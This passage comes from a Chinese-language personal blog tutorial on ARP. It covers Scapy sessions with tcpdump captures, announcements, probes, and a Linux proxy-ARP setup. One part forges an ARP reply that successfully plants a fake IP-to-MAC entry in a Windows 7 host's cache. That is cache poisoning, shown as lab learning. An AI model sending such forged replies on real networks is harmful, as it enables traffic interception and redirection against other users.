<pre><code>&gt;&gt;&gt; arp_reply = <span class="function"><span class="title">Ether</span><span class="params">(src=<span class="string">'11:11:11:11:11:11'</span>, dst=<span class="string">'C8:1F:66:05:E2:6A'</span>)</span></span>/<span class="function"><span class="title">ARP</span><span class="params">(hwtype=<span class="number">0</span>x0001,ptype=<span class="number">0</span>x0800,op=<span class="number">0</span>x0002,hwsrc=<span class="string">'11:11:11:11:11:11'</span>, hwdst=<span class="string">'C8:1F:66:05:E2:6A'</span>, psrc=<span class="string">'172.16.0.30'</span>, pdst=<span class="string">'172.16.0.17'</span>)</span></span>
&gt;&gt;&gt; recv = <span class="function"><span class="title">srp</span><span class="params">(arp_reply, timeout=<span class="number">1</span>, iface=<span class="string">'eth0'</span>)</span><span class="title">Begin</span></span> emission:
Finished to send <span class="number">1</span> packets.
...
Received <span class="number">3</span> packets, got <span class="number">0</span> answers, remaining <span class="number">1</span> packets
</code></pre><p>可以观察到包的前两个正是我们想要的。</p>
<pre><code>~ ⮀ <span class="tag">sudo</span>  <span class="tag">tcpdump</span> <span class="tag">-nni</span> <span class="tag">eth0</span> <span class="tag">arp</span> 
<span class="tag">tcpdump</span>: <span class="tag">verbose</span> <span class="tag">output</span> <span class="tag">suppressed</span>, <span class="tag">use</span> <span class="tag">-v</span> <span class="tag">or</span> <span class="tag">-vv</span> <span class="tag">for</span> <span class="tag">full</span> <span class="tag">protocol</span> <span class="tag">decode</span>
<span class="tag">listening</span> <span class="tag">on</span> <span class="tag">eth0</span>, <span class="tag">link-type</span> <span class="tag">EN10MB</span> (<span class="tag">Ethernet</span>), <span class="tag">capture</span> <span class="tag">size</span> 65535 <span class="tag">bytes</span>
17<span class="pseudo">:28</span><span class="pseudo">:55</span><span class="class">.041968</span> <span class="tag">ARP</span>, <span class="tag">Request</span> <span class="tag">who-has</span> 172<span class="class">.16</span><span class="class">.0</span><span class="class">.30</span> <span class="tag">tell</span> 172<span class="class">.16</span><span class="class">.0</span><span class="class">.17</span>, <span class="tag">length</span> 46
17<span class="pseudo">:28</span><span class="pseudo">:55</span><span class="class">.165561</span> <span class="tag">ARP</span>, <span class="tag">Reply</span> 172<span class="class">.16</span><span class="class">.0</span><span class="class">.30</span> <span class="tag">is-at</span> 11<span class="pseudo">:11</span><span class="pseudo">:11</span><span class="pseudo">:11</span><span class="pseudo">:11</span><span class="pseudo">:11</span>, <span class="tag">length</span> 28
</code></pre><p>同时发现win7的arp缓存中已经有了<code>172.16.0.30</code>。</p>
<h2 id="ARP_Announcement">ARP Announcement</h2><p>这是一种特殊的ARP请求，目标协议地址填入发送者的协议地址，将目标硬件地址设为0.</p>
<p>或者，是一种特殊的ARP响应，目标协议地址和目标硬件地址都是发送者的协议和目标硬件地址。</p>
<p>ARP announcement意在更新其它收到这个包的机器的ARP缓存。这种免费的ARP(不请自来)常用来在机器启动或换网卡时通知其它机器。也用来做负载平衡。</p>
<pre><code>&gt;&gt;&gt; arp_announcement = <span class="function"><span class="title">Ether</span><span class="params">(src=<span class="string">'11:11:11:11:11:11'</span>, dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>)</span></span>/<span class="function"><span class="title">ARP</span><span class="params">(hwtype=<span class="number">0</span>x0001,ptype=<span class="number">0</span>x0800,op=<span class="number">0</span>x0001,hwsrc=<span class="string">'11:11:11:11:11:11'</span>, hwdst=<span class="string">'00:00:00:00:00:00'</span>, psrc=<span class="string">'172.16.0.40'</span>, pdst=<span class="string">'172.16.0.40'</span>)</span></span>
&gt;&gt;&gt; recv = <span class="function"><span class="title">srp1</span><span class="params">(arp_announcement, timeout=<span class="number">2</span>)</span></span>
Begin emission:
Finished to send <span class="number">1</span> packets.

Received <span class="number">0</span> packets, got <span class="number">0</span> answers, remaining <span class="number">1</span> packets

 ~ ⮀ sudo  tcpdump -enni eth0 arp 
tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size <span class="number">65535</span> bytes
<span class="number">22</span>:<span class="number">15</span>:<span class="number">39.645293</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> &gt; ff:ff:ff:ff:ff:ff, ethertype ARP (<span class="number">0</span>x0806), length <span class="number">42</span>: Request who-has <span class="number">172.16</span>.<span class="number">0.40</span> tell <span class="number">172.16</span>.<span class="number">0.40</span>, length <span class="number">28</span>
</code></pre><p>遗憾的是，win7的ARP缓存没有接受<code>172.16.0.40</code>.</p>
<p>一个响应Announcement：</p>
<pre><code>&gt;&gt;&gt; arp_announcement = <span class="function"><span class="title">Ether</span><span class="params">(src=<span class="string">'11:11:11:11:11:11'</span>, dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>)</span></span>/<span class="function"><span class="title">ARP</span><span class="params">(hwtype=<span class="number">0</span>x0001,ptype=<span class="number">0</span>x0800,op=<span class="number">0</span>x0002,hwsrc=<span class="string">'11:11:11:11:11:11'</span>, hwdst=<span class="string">'11:11:11:11:11:11'</span>, psrc=<span class="string">'172.16.0.40'</span>, pdst=<span class="string">'172.16.0.40'</span>)</span></span>
&gt;&gt;&gt; recv = <span class="function"><span class="title">srp1</span><span class="params">(arp_announcement, timeout=<span class="number">2</span>)</span></span>

 ~ ⮀ sudo  tcpdump -enni eth0 arp 
tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size <span class="number">65535</span> bytes
<span class="number">22</span>:<span class="number">18</span>:<span class="number">21.655256</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> &gt; ff:ff:ff:ff:ff:ff, ethertype ARP (<span class="number">0</span>x0806), length <span class="number">42</span>: Reply <span class="number">172.16</span>.<span class="number">0.40</span> is-at <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>, length <span class="number">28</span>
</code></pre><h2 id="ARP_probe">ARP probe</h2><p>ARP探针是一个全0 IP地址的广播请求，用来检测IPv4地址冲突。在开始使用一个IP地址之前，实现这个规范(RFC5227)的主机必须通过ARP探针测试地址是否被使用。</p>
<p>具体过程参见RFC5227.</p>
<blockquote>
<p>A host probes to see if an address is already in use by broadcasting<br>an ARP Request for the desired address.  The client MUST fill in the<br>‘sender hardware address’ field of the ARP Request with the hardware<br>address of the interface through which it is sending the packet.  The<br>‘sender IP address’ field MUST be set to all zeroes; this is to avoid<br>polluting ARP caches in other hosts on the same link in the case<br>where the address turns out to be already in use by another host.<br>The ‘target hardware address’ field is ignored and SHOULD be set to<br>all zeroes.  The ‘target IP address’ field MUST be set to the address<br>being probed.  An ARP Request constructed this way, with an all-zero<br>‘sender IP address’, is referred to as an ‘ARP Probe’.</p>
</blockquote>
<p>类似这样：</p>
<pre><code><span class="prompt">&gt;&gt;</span>&gt; arp_probe = (<span class="constant">Ether</span>(dst=<span class="string">'ff:ff:ff:ff:ff:ff'</span>)/<span class="constant">ARP</span>(psrc=<span class="string">'0.0.0.0'</span>, pdst=<span class="string">'172.16.0.17'</span>))
<span class="prompt">&gt;&gt;</span>&gt; arp_probe.show()
<span class="comment">###[ Ethernet ]###</span>
  dst= <span class="symbol">ff:</span><span class="symbol">ff:</span><span class="symbol">ff:</span><span class="symbol">ff:</span><span class="symbol">ff:</span>ff
  src= <span class="number">11</span><span class="symbol">:</span><span class="number">11</span><span class="symbol">:</span><span class="number">11</span><span class="symbol">:</span><span class="number">11</span><span class="symbol">:</span><span class="number">11</span><span class="symbol">:</span><span class="number">11</span>
  type= <span class="number">0x806</span>
<span class="comment">###[ ARP ]###</span>
     hwtype= <span class="number">0x1</span>
     ptype= <span class="number">0x800</span>
     hwlen= <span class="number">6</span>
     plen= <span class="number">4</span>
     op= who-has
     hwsrc= <span class="number">11</span><span class="symbol">:</span><span class="number">11</span><span class="symbol">:</span><span class="number">11</span><span class="symbol">:</span><span class="number">11</span><span class="symbol">:</span><span class="number">11</span><span class="symbol">:</span><span class="number">11</span>
     psrc= <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>
     hwdst= <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span>
     pdst= <span class="number">172.16</span>.<span class="number">0</span>.<span class="number">17</span>
<span class="prompt">&gt;&gt;</span>&gt; recv = srp(arp_probe, iface=<span class="string">'eth0'</span>)
<span class="constant">Begin</span> <span class="symbol">emission:</span>
<span class="constant">Finished</span> to send <span class="number">1</span> packets.
*
<span class="constant">Received</span> <span class="number">1</span> packets, got <span class="number">1</span> answers, remaining <span class="number">0</span> packets
</code></pre><p>开始监听然后发送：</p>
<pre><code> ~ ⮀ <span class="tag">sudo</span>  <span class="tag">tcpdump</span> <span class="tag">-nni</span> <span class="tag">eth0</span> <span class="tag">arp</span> 
<span class="tag">tcpdump</span>: <span class="tag">verbose</span> <span class="tag">output</span> <span class="tag">suppressed</span>, <span class="tag">use</span> <span class="tag">-v</span> <span class="tag">or</span> <span class="tag">-vv</span> <span class="tag">for</span> <span class="tag">full</span> <span class="tag">protocol</span> <span class="tag">decode</span>
<span class="tag">listening</span> <span class="tag">on</span> <span class="tag">eth0</span>, <span class="tag">link-type</span> <span class="tag">EN10MB</span> (<span class="tag">Ethernet</span>), <span class="tag">capture</span> <span class="tag">size</span> 65535 <span class="tag">bytes</span>
22<span class="pseudo">:08</span><span class="pseudo">:56</span><span class="class">.885470</span> <span class="tag">ARP</span>, <span class="tag">Request</span> <span class="tag">who-has</span> 172<span class="class">.16</span><span class="class">.0</span><span class="class">.17</span> <span class="tag">tell</span> 0<span class="class">.0</span><span class="class">.0</span><span class="class">.0</span>, <span class="tag">length</span> 28
22<span class="pseudo">:08</span><span class="pseudo">:56</span><span class="class">.885831</span> <span class="tag">ARP</span>, <span class="tag">Reply</span> 172<span class="class">.16</span><span class="class">.0</span><span class="class">.17</span> <span class="tag">is-at</span> <span class="tag">c8</span><span class="pseudo">:1f</span><span class="pseudo">:66</span><span class="pseudo">:05</span><span class="pseudo">:e2</span><span class="pseudo">:6a</span>, <span class="tag">length</span> 46
</code></pre><p>说明有<code>172.16.0.17</code>这个地址。但可以检查一下，<code>0.0.0.0</code>并没有污染win7机器的arp缓存。</p>
<h2 id="ARP_mediation">ARP mediation</h2><p>在VPN中不同网络架构时使用ARP。略</p>
<h2 id="ARP_Stuffing">ARP Stuffing</h2><p>某些嵌入式系统，没有配置界面，用户无法使用地址分配协议，设备没有合适的IP地址，这时候主机人工填充一个IP地址到它的地址表，然后向设备发送特殊的包。设备于是采用这个IP地址和主机通信。</p>
<h2 id="ARP_Suppression">ARP Suppression</h2><p>禁用主机ARP，要求配置静态ARP缓存才能通信：</p>
<pre><code>ip link <span class="keyword">set</span> dev eth0 arp <span class="keyword">off</span>
<span class="comment"># ifconfig wlan0 -arp</span>
</code></pre><h2 id="ARP_Proxy">ARP Proxy</h2><p>同一个IP网段被某台设备分成两个部分。arp代理可以让两端的机器好像在同一以太网内工作一样。</p>
<p>举如下例子。</p>
<p>当我们有一台linux机器。其中wlan0连接无线路由，另外有一台win7机器，没有无线网卡，和linux机器的eth0直接用网线相连。</p>
<pre><code><span class="comment">Internet</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">无线路由</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">wlan0</span> <span class="title">[</span><span class="comment">Linux</span><span class="title">]</span> <span class="comment">eth0</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">windows</span> <span class="comment">7</span>
</code></pre><p>为了让windows7机器能够联网，我们可以设置windows7机器和linux机器在同一网段。比如设置：</p>
<p>先设置ip地址：</p>
<ul>
<li>路由器网关地址<code>192.168.1.1</code></li>
<li>linux在wlan0被路由器分配地址，<code>192.168.1.103</code>，子网掩码<code>255.255.255.0</code></li>
<li>windows7机器设置静态ip<code>192.168.1.114</code>，子网掩码<code>255.255.255.0</code></li>
</ul>
<p>下面我们开始设置ARP代理，在linux机器上设置内核允许代理和转发：</p>
<pre><code>gentoo ~ # echo <span class="number">1</span> &gt; /<span class="keyword">proc</span>/sys/net/ipv4/conf/eth0/proxy_arp<span class="symbol">
gentoo</span> ~ #<span class="symbol"> echo</span> 1 &gt; /<span class="keyword">proc</span>/sys/net/ipv4/conf/wlan0/proxy_arp<span class="symbol">
gentoo</span> ~ #<span class="symbol"> echo</span> 1 &gt; /<span class="keyword">proc</span>/sys/net/ipv4/ip_forward
</code></pre><p>在wlan0上对应其MAC设置想要代理的对象的静态地址(<code>192.168.1.114</code>)，让linux对wlan0上以太网响应对<code>192.168.1.114</code>的响应，并把自己的无线网卡MAC作为响应内容。</p>
<pre><code>sudo arp -i wlan0 -s <span class="number">192.168</span><span class="number">.1</span><span class="number">.114</span> <span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">11</span> pub
</code></pre><p>可以选择是否设置下一步，即使在eth0上没有ip地址也可以。</p>
<p>设置eth0接口上的ip地址(默认netmask是<code>255.255.255.0</code>)：</p>
<pre><code>sudo ifconfig eth0 inet <span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span>
</code></pre><p>添加路由：</p>
<pre><code>sudo route add <span class="number">192.168</span><span class="number">.1</span><span class="number">.114</span> eth0
</code></pre><p>linux和windows机器互ping以确保连接：</p>
<pre><code>⮀ ~ ⮀ ping -c <span class="number">2</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.114</span>
PING <span class="number">192.168</span><span class="number">.1</span><span class="number">.114</span> (<span class="number">192.168</span><span class="number">.1</span><span class="number">.114</span>) <span class="number">56</span>(<span class="number">84</span>) bytes of data.
<span class="number">64</span> bytes from <span class="number">192.168</span><span class="number">.1</span><span class="number">.114</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">128</span> time=<span class="number">0.446</span> ms
<span class="number">64</span> bytes from <span class="number">192.168</span><span class="number">.1</span><span class="number">.114</span>: icmp_seq=<span class="number">2</span> ttl=<span class="number">128</span> time=<span class="number">0.469</span> ms

--- <span class="number">192.168</span><span class="number">.1</span><span class="number">.114</span> ping statistics ---
<span class="number">2</span> packets transmitted, <span class="number">2</span> received, <span class="number">0</span>% packet loss, time <span class="number">999</span>ms
rtt min/avg/max/mdev = <span class="number">0.446</span>/<span class="number">0.457</span>/<span class="number">0.469</span>/<span class="number">0.024</span> ms
</code></pre><p>对<code>eth0</code>上将自己的有线网卡MAC设置为对<code>192.168.1.1</code>的响应。</p>
<pre><code>sudo arp -i eth0 -s <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> <span class="number">00</span>:<span class="number">24</span>:<span class="number">54</span>:<span class="number">9</span>a:<span class="number">05</span>:<span class="number">8</span>b pub
</code></pre><p>接着在windows7上尝试<code>ping</code>一下<code>192.168.1.1</code>：</p>
<p>如果在windows7机器上设置了正确的dns，就可以直接上网了。</p>
<h2 id="Reference">Reference</h2><ul>
<li><a href="en.wikipedia.org/wiki/Address_Resolution_Protocol">Address Resolution Protocol</a></li>
<li><a href="http://linux-ip.net/html/ether-arp.html" target="_blank" rel="external">Address Resolution Protocol (ARP)</a></li>
<li><a href="http://linux.vbird.org/linux_server/0230router.php#arp_proxy" target="_blank" rel="external">特殊狀況：路由器兩邊界面是同一個 IP 網段： ARP Proxy</a></li>
</ul>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    

  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right"></i></a>
  </nav>



        </div>

        


        

      </div>

      
        
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel  sidebar-panel-active ">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" src="/images/default_avatar.jpg" alt="Liu Yuyang" itemprop="image"/>
          <p class="site-author-name" itemprop="name">Liu Yuyang</p>
        </div>
        <p class="site-description motion-element" itemprop="description">我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。</p>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">169</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          <div class="site-state-item site-state-categories">
            <a href="/categories">
              <span class="site-state-item-count">23</span>
              <span class="site-state-item-name">分类</span>
              </a>
          </div>

          <div class="site-state-item site-state-tags">
            <a href="/tags">
              <span class="site-state-item-count">58</span>
              <span class="site-state-item-name">标签</span>
              </a>
          </div>

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/reverland" target="_blank">
                  
                    <i class="fa fa-github"></i> GitHub
                  
                </a>
              </span>
            
          
        </div>

        
        

        <div class="links-of-author motion-element">
          
            <p class="site-author-name">Links</p>
            
              <span class="links-of-author-item">
                <a href="http://reverland.bitbucket.org/" target="_blank">曾经的的vimwiki</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://liutos.github.com/" target="_blank">Liutos</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://blog.phoenixlzx.com/" target="_blank">凤凰君</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://gndrive.org/" target="_blank">高达数字实验室</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://www.cherrot.com/" target="_blank">Cherrot</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://xwyam.github.com/" target="_blank">xw_y_am</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://ishell.me" target="_blank">小东</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://blog.kochiya.me/" target="_blank">AS酱</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://blog.skydark.info/" target="_blank">skydark</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://thorb.cn/" target="_blank">thorb</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://www.suzibin.cn/" target="_blank">doug</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://armsword.com/" target="_blank">armsword</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://zhangwenli.com/blog" target="_blank">Ovilia</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://lilydjwg.is-programmer.com/" target="_blank">仙子</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://gaohaoyang.github.io" target="_blank">HYG</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://simmer-jun.github.io" target="_blank">Simmer</a>
              </span>
            
          
        </div>

      </section>

      

    </div>
  </aside>


      
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy;  2011 - 
  <span itemprop="copyrightYear">2015</span>
  <span class="with-love">
    <i class="icon-next-heart fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Liu Yuyang</span>
</div>

<div class="powered-by">
  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT
  </a>
</div>



      </div>
    </footer>

    <div class="back-to-top"></div>
  </div>

  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>

  
  

  
    
    

  

    <script type="text/javascript">
      var disqus_shortname = 'reverlandblog';
      var disqus_identifier = 'page/6/index.html';
      var disqus_title = '';
      var disqus_url = '';

      function run_disqus_script(disqus_script){
        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
      }

      run_disqus_script('count.js');
      
    </script>
  


  

  
  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.2"></script>


  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.2"></script>
  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
<script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>

<script type="text/javascript" src="/js/motion.js?v=0.4.5.2" id="motion.global"></script>


  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  

  <script type="text/javascript" src="/js/bootstrap.js"></script>

  
  
  <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
  </script>

  <script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for (i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';
      }
    });
  </script>

  
    <script type="text/javascript" src="http://cdn.staticfile.org/mathjax/2.4.0/MathJax.js"></script>
    <script type="text/javascript" src="http://cdn.staticfile.org/mathjax/2.4.0/config/TeX-AMS-MML_HTMLorMML.js"></script>
  


  
  

</body>
</html>
